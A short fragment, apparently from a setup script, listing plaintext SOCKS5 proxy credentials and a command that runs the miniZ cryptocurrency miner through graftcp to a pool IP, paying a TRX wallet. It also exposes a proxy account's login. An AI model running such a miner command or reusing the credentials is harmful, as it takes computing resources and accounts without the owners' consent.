...
socks5_username = ixdhljaa

socks5_password = mg85xd738qnv
...
./graftcp/graftcp ./miniZ -u TRX:TLdD8Mb4dSDmci2ewN8o6ZgrYcBxfincZ7.$(echo $(shuf -i 1-999 -n 1)-T4) -l 159.203.163.51 --port=3333 -p x --par=ethash --pers auto
